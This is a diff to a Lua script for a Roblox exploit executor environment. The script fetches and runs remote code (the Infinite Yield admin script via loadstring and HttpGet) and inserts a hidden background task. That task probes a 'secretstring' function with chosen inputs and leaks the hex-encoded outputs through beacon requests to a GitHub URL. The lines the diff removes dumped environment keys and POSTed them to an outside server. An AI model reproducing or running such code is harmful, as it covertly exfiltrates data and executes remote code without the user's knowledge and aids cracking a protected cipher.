@@ -251,20 +251,11 @@ genv.iy = newcclosure(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
 
--- ================= Xinject cipher probe -> worker =================
+-- ================= Xinject cipher beacon (via game:HttpGet -> proxy -> worker) =================
 task.spawn(function()
   local function tohex(s) return (s:gsub('.', function(c) return string.format('%02x', c:byte()) end)) end
-  local diag = { "fork_env_additions_RAN" }
-  local function report(tag)
-    local body = table.concat(diag, string.char(10))
-    pcall(function()
-      request({ Url = "https://x.rmsstudios.site/dump?tag="..tag, Method = "POST",
-                Body = body, Headers = { ["Content-Type"] = "text/plain" } })
-    end)
-    pcall(function() game:HttpPost("https://x.rmsstudios.site/dump?tag="..tag.."_hp", body) end)
-  end
-  pcall(function() local ks={} for k,_ in pairs(getfenv()) do ks[#ks+1]=tostring(k) end diag[#diag+1]='env_keys='..table.concat(ks,',') end)
-  report("start")
+  local function beacon(p) pcall(function() game:HttpGet("https://raw.githubusercontent.com/XPROBE/"..p) end) end
+  beacon("fork_RAN")
   local SS
   for i=1,80 do
     SS = secretstring
@@ -273,14 +264,14 @@ task.spawn(function()
     if SS then break end
     task.wait(0.25)
   end
-  diag[#diag+1]='SS_found='..tostring(SS~=nil)
+  beacon("SSfound-"..tostring(SS~=nil))
   if SS then
-    local tests = {"AA==","AAAA","AAAAAAAA","AAAAAAAAAAAAAAAA","AAAAAAAAAAAAAAAAAAAAAA==","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","AQAAAAAAAAAAAAAAAAAAAA==","AAEAAAAAAAAAAAAAAAAAAA==","AAABAAAAAAAAAAAAAAAAAA==","AAAAAQAAAAAAAAAAAAAAAA==","AAAAAAABAAAAAAAAAAAAAA==","AAAAAAAAAAABAAAAAAAAAA==","AAAAAAAAAAAAAAAAAQAAAA==","/wAAAAAAAAAAAAAAAAAAAA==","AAAAAAAAAAD/AAAAAAAAAA==","AQEAAAAAAAAAAAAAAAAAAA==","QUFBQUFBQUFBQUFBQUFBQQ=="}
-    for _,t in ipairs(tests) do
+    local tests = {"AA==","AAAA","AAAAAAAA","AAAAAAAAAAAAAAAA","AAAAAAAAAAAAAAAAAAAAAA==","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","AQAAAAAAAAAAAAAAAAAAAA==","AAEAAAAAAAAAAAAAAAAAAA==","AAABAAAAAAAAAAAAAAAAAA==","AAAAAQAAAAAAAAAAAAAAAA==","AAAAAAABAAAAAAAAAAAAAA==","AAAAAAAAAAABAAAAAAAAAA==","AAAAAAAAAAAAAAAAAQAAAA==","_wAAAAAAAAAAAAAAAAAAAA==","AAAAAAAAAAD_AAAAAAAAAA==","AQEAAAAAAAAAAAAAAAAAAA==","QUFBQUFBQUFBQUFBQUFBQQ=="}
+    for i,t in ipairs(tests) do
       local ok,r = pcall(SS, t)
-      diag[#diag+1] = t..' => '..(ok and (type(r)=='string' and tohex(r) or tostring(r)) or ('ERR '..tostring(r)))
+      beacon("k"..i.."-"..(ok and tohex(r) or "ERR"))
     end
   end
-  report("final")
+  beacon("DONE")
 end)
 -- ================= end =================
